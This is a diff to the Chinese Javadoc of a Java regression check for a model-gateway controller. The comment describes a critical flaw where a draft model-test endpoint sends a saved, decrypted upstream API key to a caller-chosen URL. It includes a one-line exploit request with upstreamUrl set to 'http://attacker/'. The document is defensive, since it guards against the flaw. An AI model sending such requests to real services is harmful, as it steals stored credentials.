@@ -3,14 +3,14 @@ package com.pab.ficc.ibp.modelgate.server.controller;
 /**
  * 草稿探测复用已保存密钥的主机一致性校验（main 方式，不引 JUnit）。
  *
- * <p><b>守的是一条 Critical 缺陷</b>：{@code POST /modelgate/models/test} 的草稿分支
+ * <p><b>守的是一条 Critical 缺陷</b>：{@code POST /models/test} 的草稿分支
  * 只要求 body 里 {@code upstreamUrl} 非空就成立，而 {@code credential == null} 时
  * {@code requiresSavedCredential()} 返回 true，于是服务端会加载库中<b>解密后</b>的
  * 上游厂商密钥、写进请求头、POST 到<b>调用方指定的地址</b>，上游响应还回显给调用方。
  *
  * <p>一次请求就能把密钥送走：
  * <pre>
- * POST /modelgate/models/test?modelId=&lt;任一已存在模型&gt;
+ * POST /models/test?modelId=&lt;任一已存在模型&gt;
  * {"upstreamUrl":"http://attacker/"}
  * </pre>
  *
